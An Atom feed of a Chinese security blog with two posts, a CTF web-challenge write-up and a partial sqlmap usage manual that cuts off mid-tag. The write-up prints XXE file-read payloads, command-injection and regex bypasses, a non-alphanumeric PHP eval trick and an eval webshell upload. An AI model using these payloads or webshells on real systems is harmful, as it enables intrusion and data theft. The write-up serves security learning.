<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>m&#39;bolg</title>
  
  <subtitle>做安全的渣渣辉</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="blog.manhao6.cn/"/>
  <updated>2019-10-12T14:29:41.725Z</updated>
  <id>blog.manhao6.cn/</id>
  
  <author>
    <name>Tea_Mh</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>广东强网杯--web篇</title>
    <link href="blog.manhao6.cn/2019/10/12/%E5%B9%BF%E4%B8%9C%E5%BC%BA%E7%BD%91%E6%9D%AF--web%E7%AF%87/"/>
    <id>blog.manhao6.cn/2019/10/12/广东强网杯--web篇/</id>
    <published>2019-10-12T14:08:27.000Z</published>
    <updated>2019-10-12T14:29:41.725Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00  前言"></a>0x00  前言</h1><p>好久没搭理博客，刚好今天闲着无聊就发现自己博客以及半年没跟更新了。惭愧惭愧。刚出整理出这几个月的总结发出来。以下是广东省第三届强网杯web初赛的writeup</p><h1 id="0x01-web"><a href="#0x01-web" class="headerlink" title="0x01 web"></a>0x01 web</h1><h2 id="0x01-签到题"><a href="#0x01-签到题" class="headerlink" title="0x01 签到题"></a>0x01 签到题</h2><p>网站访问 提示403. 构造HTTP请求Header实现“伪造来源IP”<br> <img src="http://picture.manhao6.cn/广东强网杯--web篇/20191012101304458.png" alt><br> <img src="http://picture.manhao6.cn/广东强网杯--web篇/20191012101319266.png" alt><br>Not admin 通过抓包分析数据看看。Admin=0,尝试admin=1，getflag<br><img src="http://picture.manhao6.cn/广东强网杯--web篇/20191012101342210.png" alt><br><a id="more"></a></p><h2 id="0x02-XXXXX？？？"><a href="#0x02-XXXXX？？？" class="headerlink" title="0x02 XXXXX？？？"></a>0x02 XXXXX？？？</h2><p><img src="http://picture.manhao6.cn/广东强网杯--web篇/20191012101447576.png" alt><br> 查看源码 无结果。联想到XXE漏洞。目录扫除查看到index.php~备份文件<br> <img src="http://picture.manhao6.cn/广东强网杯--web篇/20191012101455491.png" alt><br> <img src="http://picture.manhao6.cn/广东强网杯--web篇/20191012101502472.png" alt><br>查看源码。典型的xxe漏洞，<br> <img src="http://picture.manhao6.cn/广东强网杯--web篇/20191012101518638.png" alt><br>通过构造payload：<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?</span>xml version=<span class="string">"1.0"</span> encoding=<span class="string">"ISO-8859-1"</span><span class="meta">?&gt;</span></span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE foo [</span></span><br><span class="line"><span class="meta">&lt;!ELEMENT foo ANY &gt;</span></span><br><span class="line"><span class="meta">&lt;!ENTITY xxe SYSTEM "file:///etc/passwd" &gt;]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">creds</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">user</span>&gt;</span>&amp;xxe;<span class="tag">&lt;/<span class="name">user</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">pass</span>&gt;</span>xxe<span class="tag">&lt;/<span class="name">pass</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">creds</span>&gt;</span></span><br></pre></td></tr></table></figure></p><p><img src="http://picture.manhao6.cn/广东强网杯--web篇/20191012101552873.png" alt><br>尝试以半天读取flag.php，但是不知道文件具体目录在哪。Google一下读取相对路径来<br>利用php://filter/read=convert.base64-encode/resource=l来读取文件<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Payload</span><br><span class="line"><span class="php"><span class="meta">&lt;?</span>xml version=<span class="string">"1.0"</span> encoding=<span class="string">"ISO-8859-1"</span><span class="meta">?&gt;</span></span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE foo [</span></span><br><span class="line"><span class="meta">&lt;!ELEMENT foo ANY &gt;</span></span><br><span class="line"><span class="meta">&lt;!ENTITY xxe SYSTEM "php://filter/read=convert.base64-encode/resource=flag.php" &gt;]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">creds</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">user</span>&gt;</span>&amp;xxe;<span class="tag">&lt;/<span class="name">user</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">pass</span>&gt;</span>xxe<span class="tag">&lt;/<span class="name">pass</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">creds</span>&gt;</span></span><br></pre></td></tr></table></figure></p><p><img src="http://picture.manhao6.cn/广东强网杯--web篇/20191012101625148.png" alt><br>Bash64 解密：<br><img src="http://picture.manhao6.cn/广东强网杯--web篇/20191012101633791.png" alt><br>Flag: flag{IUyasd8213123123890}</p><h2 id="0x03-ping"><a href="#0x03-ping" class="headerlink" title="0x03 ping"></a>0x03 ping</h2><p>填写127.0.0.1 发现执行了系统命令。但显示的数据字符有限。<br><img src="http://picture.manhao6.cn/广东强网杯--web篇/20191012101652845.png" alt></p><p>尝试payload:；ls来执行系统命令,并成功执行。发现当前目录存在index.php<br> <img src="http://picture.manhao6.cn/广东强网杯--web篇/20191012101705105.png" alt><br>通过fuzz测试 发现系统采用黑名单，空格、cat、flag、| 管道符均被过滤（之前显示..也被过滤过，后来写write up发现没有）<br>之前直接采用黑名单绕过法：<br>Payload:<br><figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">;a=;c=fla;d=g;e=p;$a$b$IFS$c.$d$e</span><br><span class="line">a=..;b=/;<span class="keyword">ls</span>$IFS$a$b</span><br></pre></td></tr></table></figure></p><p><img src="http://picture.manhao6.cn/广东强网杯--web篇/20191012101725740.png" alt></p><p>查看根目录下存在flag文件，开始以为是文件，访问过之后报错。发现是文件<br>构造payload查看文件内容<br>Payload:<br><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">a</span>=c;b=at;c=fla;d=g;<span class="variable">$a</span><span class="variable">$b</span><span class="variable">$IFS</span>../../</span><br></pre></td></tr></table></figure></p><p><img src="http://picture.manhao6.cn/广东强网杯--web篇/20191012101744008.png" alt><br><img src="http://picture.manhao6.cn/广东强网杯--web篇/20191012101755246.png" alt><br>因为显示字符有限所以只能显示地点，有点搞。|管道符也是禁用了。google找了半天，终于在一个黑暗的角落看到awk命令。<br>构造payload：<br>;a=c;b=at;c=fla;d=g;awk$IFS/$c$d/$a$b$IFS../../../$c$d(第二张图是之前做题截得)<br> <img src="http://picture.manhao6.cn/广东强网杯--web篇/20191012101805266.png" alt><br> <img src="http://picture.manhao6.cn/广东强网杯--web篇/20191012101814452.png" alt><br> <img src="http://picture.manhao6.cn/广东强网杯--web篇/20191012101805266.png" alt><br>flag{llllll_U_GeT_Th3_fl4g}</p><h2 id="0x04-PHP是世界上最…-的语言"><a href="#0x04-PHP是世界上最…-的语言" class="headerlink" title="0x04  PHP是世界上最…..的语言"></a>0x04  PHP是世界上最…..的语言</h2><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">PHP是世界上最.....的语言</span><br><span class="line">http:<span class="comment">//119.61.19.212:8082/</span></span><br><span class="line">flag格式：flag&#123;xxx&#125;</span><br></pre></td></tr></table></figure><p><img src="http://picture.manhao6.cn/广东强网杯--web篇/20191012101902833.png" alt><br>通过目录扫描，发现index.php文件<br>查看得到源码<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php">error_reporting(E_ALL^E_NOTICE^E_WARNING);</span></span><br><span class="line"><span class="php"><span class="function"><span class="keyword">function</span> <span class="title">GetYourFlag</span><span class="params">()</span></span>&#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">echo</span> file_get_contents(<span class="string">"./flag.php"</span>);</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'code'</span>]))&#123;</span></span><br><span class="line"><span class="php">    $code = $_GET[<span class="string">'code'</span>];</span></span><br><span class="line"><span class="php">    <span class="keyword">if</span>(strlen($code)&gt;<span class="number">27</span>)&#123; </span></span><br><span class="line"><span class="php">        <span class="keyword">die</span>(<span class="string">"Too Long."</span>);</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">    <span class="keyword">if</span>(preg_match(<span class="string">'/[a-zA-Z0-9_&amp;^&lt;&gt;"\']+/'</span>,$_GET[<span class="string">'code'</span>])) &#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">die</span>(<span class="string">"Not Allowed."</span>);</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php">    @<span class="keyword">eval</span>($_GET[<span class="string">'code'</span>]);</span></span><br><span class="line"><span class="php">&#125;<span class="keyword">else</span>&#123;</span></span><br><span class="line"><span class="php">      highlight_file(<span class="keyword">__FILE__</span>);</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure></p><p>阅读了下下发现对code字符<br>搜索下关键字发现是无数字webshell，而且是去年的一个题的。不过做了做了更多的限制<br>除了限制字母数字外 限制了_ &lt; &gt; ^]等字符，并且长度小于27.<br>搜索下无数字webshell，<br>有三种方法1.通过与或运算 2 通过取反运算 3.通过自增<br>三种方式都可以构造无数字webshell<br>由于^在黑名单，则考虑取反运算<br>本地搭建环境<br>Getyourfalg取反<br> <img src="http://picture.manhao6.cn/广东强网杯--web篇/20191012101927812.png" alt><br> <img src="http://picture.manhao6.cn/广东强网杯--web篇/20191012101937298.png" alt><br>从而构造payload ?code=$<em>=~ %98%9A%8B%86%90%8A%8D%99%93%9E%98;$</em>()<br>发送，发现过滤了_字符。。网上搜了下可以根据php7的特性：php7允许使用($a)();执行函数<br>构造payload：(~%98%9A%8B%86%90%8A%8D%99%93%9E%98)()<br> <img src="http://picture.manhao6.cn/广东强网杯--web篇/20191012101947308.png" alt><br>成功。查看源码.getflag<br> <img src="http://picture.manhao6.cn/广东强网杯--web篇/20191012101955205.png" alt></p><h2 id="0x05-代码审计"><a href="#0x05-代码审计" class="headerlink" title="0x05 代码审计"></a>0x05 代码审计</h2><p>当时放弃了</p><h2 id="0x06-api"><a href="#0x06-api" class="headerlink" title="0x06 api"></a>0x06 api</h2><p><a href="http://119.61.19.212:8086/" target="_blank" rel="noopener">http://119.61.19.212:8086/</a>  查看源码无任何东西<br>owasp zap目录扫描 发现存在<br>upload 403<br><a href="http://119.61.19.212:8086/api/" target="_blank" rel="noopener">http://119.61.19.212:8086/api/</a>  200 OK<br><img src="http://picture.manhao6.cn/广东强网杯--web篇/20191012102032417.png" alt><br>访问该目录<br><img src="http://picture.manhao6.cn/广东强网杯--web篇/20191012102041363.png" alt><br>构造POST 文件 但是无法知道数组字段 尝试json数据<br>{“filename”：”1”}一直不行.<br>不断尝试字段发现filename=1  提示sorry cant read file<br> <img src="http://picture.manhao6.cn/广东强网杯--web篇/20191012102054317.png" alt><br>构造payload：filename={“name”:”flag”}<br>payload：filename={“data”:”flag”}<br>payload：filename={“filename”:”flag”} 均无果，后来对有说试一试file 结果显示空白，说明猜中了字段6666666666<br>查实读取文件，直接../../../../../../../../../../etc/passwd 成功读取，说明存在文件包含漏洞<br><img src="http://picture.manhao6.cn/广东强网杯--web篇/20191012102107567.png" alt><br>后来发现可以直接读index.php文件<br>读取/api/index.php文件 POST data= filename={“file”:”./index.php”}，右键查看源码得到数据<br> <img src="http://picture.manhao6.cn/广东强网杯--web篇/20191012102122099.png" alt><br>无可利用信息，尝试data= filename={“file”:”../index.php”}，读取根目录文件夹文件，发现是php反序列化的题<br> <img src="http://picture.manhao6.cn/广东强网杯--web篇/20191012102131547.png" alt><br> <img src="http://picture.manhao6.cn/广东强网杯--web篇/20191012102139060.png" alt><br>继续读取，hack.php<br> <img src="http://picture.manhao6.cn/广东强网杯--web篇/20191012102147055.png" alt><br>Hack.php中过滤了”//””/””..”防止读取其他目录其他文件，并给出提示在fffffaa_not.php文件<br>在反序列化中，preg_match(‘/[oc]:\d+:/i’,$data,$matches);筛掉了[oc]:数字: 如果payload：O:4:”hack”:1:{s:4:”file”;s:15:” fffffaa_not.php”;}中前面的O:4:符合正则的条件，因此将其绕过即可。利用符号+就不会正则匹配到数字<br>正确payload：O:4:”hack”:1:{s:4:”file”;s:15:” fffffaa_not.php”;}但是提示无任何反应，尝试下url编码，成功。。（还剩半小时就结束了，慌的一批，还是不知道后面还有多少坑。。）<br> <img src="http://picture.manhao6.cn/广东强网杯--web篇/20191012102155711.png" alt><br>查看源码<br> <img src="http://picture.manhao6.cn/广东强网杯--web篇/20191012102226062.png" alt><br> <img src="http://picture.manhao6.cn/广东强网杯--web篇/20191012102237153.png" alt><br>上传文件，那就可以上传webshell。 对上传的数据黑名单匹配，之前遇到过，通过数组可以绕过。is_numeric()函数没遇到过，google一下就给绕过方法，通过在末尾加空格和任意字符绕过。<br><img src="http://picture.manhao6.cn/广东强网杯--web篇/20191012102259726.png" alt><br>Payload为：<br><a href="http://119.61.19.212:8086/fffffaa_not.php?jhh08881111jn[]=" target="_blank" rel="noopener">http://119.61.19.212:8086/fffffaa_not.php?jhh08881111jn[]=</a>&lt;?php eval($_POST[“CMD”]);?&gt;&amp;&amp;file_na=2<br>连接蚁剑连接。发现这么多php文件，难道大家都做出来了？？？找了半天没发现flag文。<br> <img src="http://picture.manhao6.cn/广东强网杯--web篇/20191012102311372.png" alt><br>还是一份钟了，当时慌的一批。手残点了一个php文件？？？？？然后getflag ，，这也太搞了吧。。最后一分钟getflag。。。。。。。。。。<br> <img src="http://picture.manhao6.cn/广东强网杯--web篇/20191012102320487.png" alt></p><h1 id="0x03-总结"><a href="#0x03-总结" class="headerlink" title="0x03 总结"></a>0x03 总结</h1><p>本地比赛发现自己在代码审计能力方面还是有很多不足，还需要努力学习</p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00  前言&quot;&gt;&lt;/a&gt;0x00  前言&lt;/h1&gt;&lt;p&gt;好久没搭理博客，刚好今天闲着无聊就发现自己博客以及半年没跟更新了。惭愧惭愧。刚出整理出这几个月的总结发出来。以下是广东省第三届强网杯web初赛的writeup&lt;/p&gt;
&lt;h1 id=&quot;0x01-web&quot;&gt;&lt;a href=&quot;#0x01-web&quot; class=&quot;headerlink&quot; title=&quot;0x01 web&quot;&gt;&lt;/a&gt;0x01 web&lt;/h1&gt;&lt;h2 id=&quot;0x01-签到题&quot;&gt;&lt;a href=&quot;#0x01-签到题&quot; class=&quot;headerlink&quot; title=&quot;0x01 签到题&quot;&gt;&lt;/a&gt;0x01 签到题&lt;/h2&gt;&lt;p&gt;网站访问 提示403. 构造HTTP请求Header实现“伪造来源IP”&lt;br&gt; &lt;img src=&quot;http://picture.manhao6.cn/广东强网杯--web篇/20191012101304458.png&quot; alt&gt;&lt;br&gt; &lt;img src=&quot;http://picture.manhao6.cn/广东强网杯--web篇/20191012101319266.png&quot; alt&gt;&lt;br&gt;Not admin 通过抓包分析数据看看。Admin=0,尝试admin=1，getflag&lt;br&gt;&lt;img src=&quot;http://picture.manhao6.cn/广东强网杯--web篇/20191012101342210.png&quot; alt&gt;&lt;br&gt;
    
    </summary>
    
      <category term="0x02 应用实践" scheme="blog.manhao6.cn/categories/0x02-%E5%BA%94%E7%94%A8%E5%AE%9E%E8%B7%B5/"/>
    
      <category term="CTF" scheme="blog.manhao6.cn/categories/0x02-%E5%BA%94%E7%94%A8%E5%AE%9E%E8%B7%B5/CTF/"/>
    
    
      <category term="writeup" scheme="blog.manhao6.cn/tags/writeup/"/>
    
  </entry>
  
  <entry>
    <title>sqlmap使用手册</title>
    <link href="blog.manhao6.cn/2019/04/06/sql%E6%B3%A8%E5%85%A5%E4%B8%8Esqlmap%E5%AE%9E%E8%B7%B5/"/>
    <id>blog.manhao6.cn/2019/04/06/sql注入与sqlmap实践/</id>
    <published>2019-04-06T08:43:32.000Z</published>
    <updated>2019-05-24T18:00:01.531Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x01-前言"><a href="#0x01-前言" class="headerlink" title="0x01 前言"></a>0x01 前言</h1><p>很多人会思考个概念使用工具去入侵机器？脚本小子？不，使用工具是对技术和开发者项工具的人的尊重，而脚本小子是并不知道什么原理就去拿工具去扫描。<br>sqlmap——-&gt;<a href="http://sqlmap.org/" target="_blank" rel="noopener">官方网站</a><br>是由python编写的开源自动化sql检测和利用工具。本文章是sqlmap使用总结和知识回顾</p><h2 id="工作模式"><a href="#工作模式" class="headerlink" title="工作模式"></a>工作模式</h2><p>sql执行操作后：</p><blockquote><p>1、判断可注入的参数<br>2、判断可以用那种SQL注入技术来注入<br>3、识别出哪种数据库<br>4、根据用户选择，做相应的操作</p></blockquote><a id="more"></a><h2 id="特点"><a href="#特点" class="headerlink" title="特点"></a>特点</h2><ul><li>MySQL, Oracle, PostgreSQL, Microsoft SQL Server, Microsoft Access, IBM DB2, SQLite, Firebird, Sybase和SAP MaxDB 等数据库均支持</li><li><p>支持五种不同的注入模式：</p><blockquote><p>1、基于布尔的盲注，即可以根据返回页面判断条件真假的注入。<br>2、基于时间的盲注，即不能根据页面返回内容判断任何信息，用条件语句查看时间延迟语句是否执行（即页面返回时间是否增加）来判断。<br>3、基于报错注入，即页面会返回错误信息，或者把注入的语句的结果直接返回在页面中。<br>4、联合查询注入，可以使用union的情况下的注入。<br>5、堆查询注入，可以同时执行多条语句的执行时的注入</p></blockquote></li><li><p>支持枚举用户、密码、哈希、权限、角色、数据库、数据表和列</p></li><li>支持脱库操作（用户可自行选择）</li><li>支持上传下载文件和命令执行（mysql，postgresql，sql server）</li></ul><h1 id="sqlmap使用"><a href="#sqlmap使用" class="headerlink" title="sqlmap使用"></a>sqlmap使用</h1><p>sql执行包括</p><ul><li>Target（目标）</li><li>Request（请求）</li><li>Optimization（优化）</li><li>Injection（注入）</li><li>Detection（检测）</li><li>Techniques（技巧）</li><li>Fingerprint（指纹）</li><li>Enumeration（枚举）</li><li>Brute force（暴力破解）</li><li>User-defined function injection（用户自定义函数注入）</li><li>File system access（访问文件系统）</li><li>Operating system access（操作系统访问）</li><li>Windows注册表访问</li><li>General（一般）和杂项：</li></ul><h2 id="Target（目标）"><a href="#Target（目标）" class="headerlink" title="Target（目标）"></a>Target（目标）</h2><h3 id="参数：-–url-u"><a href="#参数：-–url-u" class="headerlink" title="参数： –url -u"></a>参数： –url -u</h3><p>格式：http(s)://targeturl[:port]/[…]<br>例如：python sqlmap.py -u”<a href="http://www.baidu.com/?id=1&quot;" target="_blank" rel="noopener">http://www.baidu.com/?id=1&quot;</a> </p><h3 id="参数：-m-l"><a href="#参数：-m-l" class="headerlink" title="参数： -m -l"></a>参数： -m -l</h3><p>-m获取多个扫描目标，sqlmap会一个个检测。<br>文件格式如：</p><blockquote><p><a href="http://www.baidu.com?id=1" target="_blank" rel="noopener">www.baidu.com?id=1</a><br><a href="http://www.sougou.com?id=2" target="_blank" rel="noopener">www.sougou.com?id=2</a><br><a href="http://www.xx.com?id=3、" target="_blank" rel="noopener">www.xx.com?id=3、</a></p></blockquote><p>-l从Burp或WebScarab代理的日志中解析目标（包括post，cookie）</p><h3 id="参数：-d"><a href="#参数：-d" class="headerlink" title="参数：-d"></a>参数：-d</h3><p>直接连接数据库<br>使用参数“-d”直接连接数据库，该参数后跟一个表示数据库的字符串，该字符串有以下两种格式：</p><p>(1).当数据库管理系统是MySQL、Oracle、Microsoft SQL Server或PostgreSQL等时格式为：</p><blockquote><p>DBMS://USER:PASSWORD@DBMS_IP:DBMS_PORT/DATABASE_NAME</p></blockquote><p>(2).当数据库管理系统是SQLite、Microsoft Access或Firebird等时格式为：</p><blockquote><p>DBMS://DATABASE_FILEPATH</p></blockquote><p>我用如下命令连接装在本机上的Mysql：</p><blockquote><p>python sqlmap.py -d “mysql://root:<a href="mailto:root@127.0.0.1" target="_blank" rel="noopener">root@127.0.0.1</a>:3306/DISSchool”</p></blockquote><p>却出现了错误，错误为：</p><blockquote><p> [CRITICAL] sqlmap requires ‘python-pymysql’ third-party library in order to directly connect to the DBMS ‘MySQL’. You can download it from ‘<a href="https://github.com/petehunt/PyMySQL/&#39;" target="_blank" rel="noopener">https://github.com/petehunt/PyMySQL/&#39;</a>. Alternative is to use a package ‘python-sqlalchemy’ with support for dialect ‘mysql’ installed</p></blockquote><p>意思是我没有安装Python连接Mysql用的第三方库python-pymysql。虽然我安装了python-mysqldb可以使Python连接Mysql，但显然Sqlmap使用的是python-pymysql而不是python-mysqldb。使用如下命令安装python-pymysql：</p><blockquote><p> git clone <a href="https://github.com/petehunt/PyMySQL/" target="_blank" rel="noopener">https://github.com/petehunt/PyMySQL/</a><br>  cd PyMySQL/<br>  sudo python setup.py install</p></blockquote><p>安装好python-pymysql后再执行命令：</p><blockquote><p>python sqlmap.py -d “mysql://root:<a href="mailto:root@127.0.0.1" target="_blank" rel="noopener">root@127.0.0.1</a>:3306/DISSchool”</p></blockquote><p>这次没有报错，成功的连接到了数据库。只是除了检测数据库确实是Mysql版本号大于等于5.0.0之外便什么都没有做。让Sqlmap做点什么需要用其他参数指定，这些参数我们稍晚些再学习。</p><h3 id="参数：-r"><a href="#参数：-r" class="headerlink" title="参数： -r"></a>参数： -r</h3><p>sqlmap可以从文本获取http请求头。有的请求需要加载cookie，post数据，有些waf，阿里云会根据sql请求头（User-agent: sqlmap/1.3#stable (<a href="http://sqlmap.org)）而封ip，这样加载可以通过一些检测和跳过设置cookie" target="_blank" rel="noopener">http://sqlmap.org)）而封ip，这样加载可以通过一些检测和跳过设置cookie</a><br>如：</p><blockquote><p>POST /vuln.php HTTP/1.1<br>Host: <a href="http://www.baidu.com" target="_blank" rel="noopener">www.baidu.com</a><br>User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:66.0) Gecko/20100101 Firefox/66.0<br>Cookie:BAIDUID=2FF9C5F75287AE0C94B0E3E9C8FE<br>id=1</p></blockquote><h3 id="参数：-g"><a href="#参数：-g" class="headerlink" title="参数：-g"></a>参数：-g</h3><p>-g 处理Google的结果作为目标URL</p><blockquote><p>python sqlmap.py -g “inurl:\”.php?id=1\””</p></blockquote><h3 id="参数：-c"><a href="#参数：-c" class="headerlink" title="参数：-c"></a>参数：-c</h3><p>CONFIGFILE 从配置文件中加载选项,需指定文件如sqlmap.conf，sqlmap会自动解析该配置文件，按照配置文件配置执行动作，除了指定攻击目标还支持，指定对应目标的各种参数(格式如安装目录中有一个名为 sqlmap.conf 的文件)</p><h2 id="Request（请求）"><a href="#Request（请求）" class="headerlink" title="Request（请求）"></a>Request（请求）</h2><p>在http请求阶段，往往在不同网站不同位置要求携带不同参数（refer，user-agent，cookie，post），只有携带要求的参数才能发起合法的请求。所以我们要根据目标网站需要而设定请求细节。</p><h3 id="参数：–data-–param-del"><a href="#参数：–data-–param-del" class="headerlink" title="参数：–data,–param-del"></a>参数：–data,–param-del</h3><p>此参数是把数据以POST方式提交，sqlmap会像检测GET参数一样检测POST的参数。</p><blockquote><p>python sqlmap.py -u “<a href="http://www.baidu.com/1.php&quot;" target="_blank" rel="noopener">http://www.baidu.com/1.php&quot;</a> –data=”id=1”</p></blockquote><p>–param-del当GET或POST的数据需要用其他字符分割测试参数的时候需要用到此参数。</p><blockquote><p>python sqlmap.py -u “<a href="http://www.baidu.com/1.php&quot;" target="_blank" rel="noopener">http://www.baidu.com/1.php&quot;</a> –data=”query=x;id=1” –param-del=”;”</p></blockquote><h3 id="参数：–cookie-–load-cookies-–drop-set-cookie-–cookie-del"><a href="#参数：–cookie-–load-cookies-–drop-set-cookie-–cookie-del" class="headerlink" title="参数：–cookie,–load-cookies,–drop-set-cookie –cookie-del"></a>参数：–cookie,–load-cookies,–drop-set-cookie –cookie-del</h3><p>有两种情况需要cookie：</p><ul><li>注入的界面需要登录才能获取</li><li>cookie是否存在注入</li></ul><p>可以通过抓包把cookie获取到，复制出来，然后加到–cookie参数里。<br>load-cookie从文件读取cookie<br>如果你不想接受Set-Cookie可以使用–drop-set-cookie参数来拒接。<br>当你使用–cookie参数时，当返回一个Set-Cookie头的时候，sqlmap会询问你用哪个cookie来继续接下来的请求。当–level的参数设定为2或者2以上的时候，sqlmap会尝试注入Cookie参数<br>post参数默认分隔符；，指定分隔符–cookie-del </p><blockquote><p>python sqlmap.py -u “<a href="http://www.baidu.com/user.php&quot;" target="_blank" rel="noopener">http://www.baidu.com/user.php&quot;</a> --cookie “JSESSIONID=E5D6C8C81;NAME=werner;”</p></blockquote><h3 id="参数：–user-agent-–random-agent"><a href="#参数：–user-agent-–random-agent" class="headerlink" title="参数：–user-agent,–random-agent"></a>参数：–user-agent,–random-agent</h3><p>默认sqlmap请求头为如下，这种可能会被waf检测直接封ip</p><blockquote><p>User-agent: sqlmap/1.3#stable</p></blockquote><p>–user-agent用户指定请求头<br>–random-agnet参数来随机的从./txt/user-agents.txt中获取<br>当–level参数设定为3或者3以上的时候，会尝试对User-Angent进行注入。</p><h3 id="参数：–referer"><a href="#参数：–referer" class="headerlink" title="参数：–referer"></a>参数：–referer</h3><p>sqlmap可以在请求中伪造HTTP中的referer，当–level参数设定为3或者3以上的时候会尝试对referer注入</p><h3 id="参数：–headers"><a href="#参数：–headers" class="headerlink" title="参数：–headers"></a>参数：–headers</h3><p>可以通过–headers参数来增加额外的http头</p><h3 id="参数：–delay"><a href="#参数：–delay" class="headerlink" title="参数：–delay"></a>参数：–delay</h3><p>过于频繁地发送请求可能会被网站察觉或其他后果,严重者可能服务器崩溃。<br>使用参数“–delay”来指定 HTTP 请求之间的延迟，单位为秒，类型是浮点数，如“–delay 1.5”表示延迟 1.5 秒。默认是没有延迟的</p><h3 id="参数：–timeout"><a href="#参数：–timeout" class="headerlink" title="参数：–timeout"></a>参数：–timeout</h3><p>可以设定一个HTTP(S)请求超过多久判定为超时，10.5表示10.5秒，默认是30秒</p><h3 id="参数：–retries"><a href="#参数：–retries" class="headerlink" title="参数：–retries"></a>参数：–retries</h3><p>当HTTP(S)超时时，可以设定重新尝试连接次数，默认是3次</p><h3 id="参数：–randomize"><a href="#参数：–randomize" class="headerlink" title="参数：–randomize"></a>参数：–randomize</h3><p>可以设定某一个参数值在每一次请求中随机的变化，长度和类型会与提供的初始值一样</p><h3 id="参数：–safe-url-–safe-post-–safe-freq-–safe-feq"><a href="#参数：–safe-url-–safe-post-–safe-freq-–safe-feq" class="headerlink" title="参数：–safe-url,–safe-post –safe-freq –safe-feq"></a>参数：–safe-url,–safe-post –safe-freq –safe-feq</h3><p>有的web应用程序会在你多次访问错误的请求时屏蔽掉你以后的所有请求，这样在sqlmap进行探测或者注入的时候可能造成错误请求而触发这个策略，导致以后无法进行</p><blockquote><p>1、–safe-url：提供一个安全不错误的连接，每隔一段时间都会去访问一下。<br>2、–safe-post: 访问安全 URL 时携带的 POST 数据<br>3、–safe-freq：提供一个安全不错误的连接，每次测试请求之后都会再访问一边安全连接。<br>4、–safe-req: 从文件中载入安全 HTTP 请求</p></blockquote><h3 id="参数：–skip-urlencode"><a href="#参数：–skip-urlencode" class="headerlink" title="参数：–skip-urlencode"></a>参数：–skip-urlencode</h3><p>根据参数位置，他的值默认将会被URL编码，但是有些时候后端的web服务器不遵守RFC标准，只接受不经过URL编码的值，这时候就需要用–skip-urlencode参数</p><h3 id="参数：–csrf-token-和–csrf-url"><a href="#参数：–csrf-token-和–csrf-url" class="headerlink" title="参数：–csrf-token 和–csrf-url"></a>参数：–csrf-token 和–csrf-url</h3><p>现在有很多网站通过在表单中添加值为随机生成的 token 的隐藏字段来防止 CSRF 攻击，Sqlmap 会自动识别出这种保护方式并绕过。但自动识别有可能失效，此时就要用到这两个参数。</p><ul><li>–csrf-token   用于指定包含 token 的隐藏字段名，若这个字段名不是常见的防止 CSRF 攻击的字段名 Sqlmap 可能不能自动识别出，需要手动指定。如 Django 中该字段名为“csrfmiddlewaretoken”，明显与 CSRF 攻击有关。</li><li>–csrf-url   用于从任意的 URL 中回收 token 值。若最初有漏洞的目标 URL 中没有包含 token 值而又要求在其他地址提取 token 值时该参数就很有用</li></ul><h3 id="参数：–eval"><a href="#参数：–eval" class="headerlink" 